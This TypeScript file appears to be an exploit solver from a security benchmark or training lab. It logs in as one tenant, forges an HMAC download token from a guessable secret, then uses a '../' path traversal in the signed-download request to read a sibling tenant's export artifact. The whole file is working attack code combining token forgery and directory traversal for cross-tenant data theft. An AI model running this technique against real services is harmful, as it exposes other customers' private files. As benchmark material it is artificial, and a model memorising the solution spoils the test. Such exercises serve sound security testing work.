// Artifact walkthrough: take a finished export link, mint the digest the way the console does, fetch
// it once, then keep the same digest while resolving the link through a parent segment.
import { createHmac } from 'node:crypto'
import type { SolverCtx, SolverResponse } from '../../../../lib/types.ts'

interface ExportItem { path?: unknown }

function url(ctx: SolverCtx, routeKey: string): string {
  return ctx.plan.routes[routeKey]!.path
}

function ok(res: SolverResponse, label: string): SolverResponse {
  if (res.status < 200 || res.status >= 300) throw new Error(`${label} returned ${res.status}`)
  return res
}

export async function solve(ctx: SolverCtx): Promise<void> {
  const session = await ctx.login('member_a')
  const tenant = ctx.persona('member_a').tenant
  const sibling = ctx.persona('member_b').tenant
  const saltTag = ctx.plan.canarySalt.replace(/[^a-z0-9]/gi, '').slice(0, 12).toLowerCase() || 'seed'
  const secret = `rb_fake_jwt_${saltTag}`
  const listed = ok(await ctx.request({ method: 'GET', path: url(ctx, 'listExports'), headers: session }), 'list exports')
  const items = listed.json<{ items?: ExportItem[] }>().items ?? []
  const target = String(items.find((item) => String(item.path ?? ''))?.path ?? '')
  if (!target) throw new Error('no finished export artifact')
  const expiry = String(Date.now() + 600_000)
  const linkToken = (path: string): string => createHmac('sha256', secret).update(`${tenant}.${path}.${expiry}`).digest('hex')
  const fetch = (path: string): Promise<SolverResponse> => ctx.request({
    method: 'GET',
    path: `${url(ctx, 'signedDownload')}?path=${encodeURIComponent(path)}&exp=${expiry}&token=${linkToken(path)}`,
    headers: session,
  })
  ok(await fetch(target), 'fetch artifact')
  await fetch(`/exports/${tenant}/../${sibling}/artifact.json`)
}
